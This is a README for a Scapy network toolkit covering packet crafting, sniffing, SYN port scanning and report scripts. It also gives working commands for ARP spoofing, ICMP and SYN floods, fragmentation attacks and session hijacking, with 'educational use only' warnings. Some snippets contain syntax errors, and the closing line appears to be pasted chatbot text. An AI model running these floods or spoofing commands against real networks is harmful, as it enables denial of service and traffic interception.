# 🧪 Scapy Toolkit: Network Crafting, Analysis & Automation

This project is a collection of Scapy commands and techniques designed for network exploration, penetration testing, and packet crafting. Intended for educational and ethical use only.

---

## 🔧 Installation

### On Kali Linux (Pre-installed)
```bash
scapy
````

### Manual Installation

```bash
git clone https://github.com/secdev/scapy.git
cd scapy
sudo ./run_scapy
```

---

## 🧠 Basic Scapy Commands

### Start Scapy Console

Launch the Scapy interactive shell.

```python
>>> scapy
```
![image](https://github.com/user-attachments/assets/7376df70-3afe-4372-b2fa-29980a6e66cb)

### List Available Protocols

Shows a list of supported protocol layers.

```python
>>> ls()
```

![image](https://github.com/user-attachments/assets/a1f2ad75-97fa-41b3-8325-90a161e2a6ad)

we can also use the explore for the GUI-interface of the Scapy:
![image](https://github.com/user-attachments/assets/f5c70fbc-30ff-40f7-a2ff-ef5777abfd58)


### Show Protocol Details

Displays detailed structure of a specific protocol (e.g., TCP).

```python
>>> ls(TCP)
![image](https://github.com/user-attachments/assets/0e6111b7-4402-4909-91fc-436cdcbd31cb)

```

---

## 📦 Packet Crafting Essentials

### ICMP Echo Request (Ping)

Creates an ICMP echo packet (layer 3) with a payload.

```python
>>> pkt(this is packet name) = IP(dst="<destination-ip")/ICMP()/"HELLO"
![image](https://github.com/user-attachments/assets/2de43057-a1fa-44b5-af44-2d40f4c50bb0)

```


### View Packet Structure

Displays fields and structure of the crafted packet.

```python
>>> pkt.show()
```
![image](https://github.com/user-attachments/assets/f96091db-dd4f-4488-90a2-99d58f727c42)


### ARP Who-Has Broadcast (Layer 2)

Crafts an Ethernet + ARP broadcast to discover devices.

```python
>>> arp_pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24")
```
![image](https://github.com/user-attachments/assets/3f6674a4-6029-43cc-b57b-1684342449d1)

---

## 📤 Packet Transmission

### Send Packet at Layer 3 (IP)

```python
>>> send(pkt)
```
![image](https://github.com/user-attachments/assets/a35b9631-0a34-4011-8c90-473087109f70)

### Send Frame at Layer 2 (Ethernet)

```python
>>> sendp(arp_pkt)
```
![image](https://github.com/user-attachments/assets/27c1f36d-f6b6-4463-845f-a211d9c6522e)

### Send and Receive One Response

```python
>>> ans = sr1(IP(dst="scanme.nmap.org")/TCP(dport=80, flags="S"))
```
![image](https://github.com/user-attachments/assets/fa638ddc-5645-4792-a111-b713d2195699)

### Fast Packet Flooding

Used for stress testing or flooding (caution).

```python
>>> sendpfast(Ether()/IP(dst="192.168.1.255")/ICMP(), mbps=10)
```
![image](https://github.com/user-attachments/assets/5ccab52d-c6ca-475e-99bc-a925917bec2f)

---

## 🔍 Network Analysis

### Sniff 100 Packets (With Filter)

Captures 100 packets with a TCP port filter.

```python
>>> pkts = sniff(count=100, filter="tcp port 80")
```
![image](https://github.com/user-attachments/assets/f5aa5869-4b4c-46f6-8429-a348eb95af0c)

### Real-Time Packet Summary

Prints a summary of each packet as it's captured.

```python
>>> sniff(prn=lambda x: x.summary())
```
![image](https://github.com/user-attachments/assets/e8ea341d-b934-4cfd-8e12-9fb5bc5953c6)

### Hex Dump Analysis

Displays hexadecimal representation of the packet.

```python
>>> hexdump(pkt)
```
![image](https://github.com/user-attachments/assets/e85b37c9-56a2-47e0-8229-3754535a6ae8)

### Export Packet as PDF

Saves a visual representation of the packet to PDF.

```python
>>> pdfdump(pkt, "packet.pdf")
```

---

## 🧩 Advanced Techniques

### Custom Protocol Stack

Create and bind a custom protocol to TCP.

```python
>>> class MyProto(Packet):
...     name = "MyProto"
...     fields_desc = [
...         ShortField("id", 0),
...         XIntField("secret", 0xdeadbeef)
...     ]

>>> bind_layers(TCP, MyProto, dport=9999)
```
![image](https://github.com/user-attachments/assets/14eba087-ba30-4f09-b45f-4898d044d711)

### ARP Spoofing (Man-in-the-Middle)

Sends continuous fake ARP replies to poison the ARP table.

```python
>>> arp_poison = ARP(op=2, psrc="192.168.1.1", pdst="192.168.1.100")
>>> send(arp_poison, inter=1, loop=1)
```
![image](https://github.com/user-attachments/assets/0bf6add9-4896-4514-8156-5053182c7532)

---

## 🎯 Mastery-Level Features

### SYN Scan for Ports

Performs a TCP SYN scan on ports 1-1024.

```python
>>> ans, unans = sr(IP(dst="target")/TCP(dport=(1-1024), flags="S"))
```![image](https://github.com/user-attachments/assets/478a5f19-3a74-4ff7-9079-bdddec061024)


### Analyze Scan Results

Summarizes scan responses by source port and TCP flags.

```python
>>> ans.summary(lambda s,r: r.sprintf("%TCP.sport% \t %TCP.flags%"))
```

### Fragmentation Attack

Creates oversized packets to test for fragmentation vulnerabilities.

```python
>>> frags = fragment(IP(dst="target")/ICMP()/("X"*60000))
```

### Simulated Session Hijacking

Crafts a fake TCP packet to simulate hijacking.

```python
>>> hijack = IP(src="client", dst="server")/TCP(sport=1234, dport=80, seq=1000, ack=5000)/"POST / HTTP/1.1\r\nHost: server\r\n\r\n"
```

---

## ⚠️ DoS Attack Examples (For Educational Use Only!)

### ICMP Ping Flood

Sends a large number of pings with large payloads.

```python
>>> send(IP(dst="192.168.1.10")/ICMP()/("X"*1024), count=1000)
```
![image](https://github.com/user-attachments/assets/47458fd0-c384-4478-8926-31e73e6fec0c)


### TCP SYN Flood

Continuously sends TCP SYN packets to overwhelm the target.

```python
>>> send(IP(dst="192.168.1.10")/TCP(dport=80, flags="S"), loop=1, inter=0.01)
```![image](https://github.com/user-attachments/assets/28d38705-f0d0-48cd-b612-a00d3637c974)


> ⚠️ **Warning:** These commands are for **lab testing** only. Do not use on real networks without explicit authorization.

---

## 🤖 Ethical Automation Scripts

### Port Scanner Function

Scans ports and filters for SYN-ACK responses.

```python
def port_scan(target, ports):
    ans, unans = sr(IP(dst=target)/TCP(dport=ports, flags="S"), timeout=2)
    return ans.filter(lambda s,r: r.haslayer(TCP) and r[TCP].flags & 0x12)
```
![image](https://github.com/user-attachments/assets/cfe9f049-995e-461d-9ec6-50a68bbc463d)

### Packet Capture Report Generator

Creates a readable text report from captured packets.

```python
def generate_report(pkts):
    report = "\n".join([f"{p.time} | {p.summary()}" for p in pkts])
    with open("scan_report.txt", "w") as f:
        f.write(report)
```

---

## 🔄 Restart Scapy

### Restart Command

Restarts the current Scapy session.

```bash
>>> restart
```

### Expected Output

```python
INFO: Restarting Scapy...
Welcome to Scapy (3.0.0)
>>>
```

---

## 📌 Disclaimer

This toolkit is for **educational** and **ethical hacking** purposes only. Do not use on networks without proper authorization.

---

## 👨‍💻 Author

Created & maintained by \[SohaibBaloch978].
Feel free to contribute, open issues, or suggest improvements.

```

---

Let me know if you also want a `.pdf` or `.docx` version for download or a custom banner/logo for your GitHub repository.
```
